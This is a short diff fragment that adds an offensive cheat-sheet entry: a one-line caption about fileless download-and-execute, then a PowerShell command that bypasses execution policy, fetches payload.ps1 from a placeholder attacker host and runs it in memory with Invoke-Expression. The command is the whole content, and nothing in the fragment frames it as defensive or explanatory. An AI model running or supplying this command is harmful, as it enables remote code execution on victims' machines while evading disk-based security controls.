@@ -1,0 +1,3 @@
+Download and execute a PowerShell script without touching the disk (fileless).
+
+powershell -exec bypass -c "iwr('http://attacker_ip/payload.ps1')|iex"
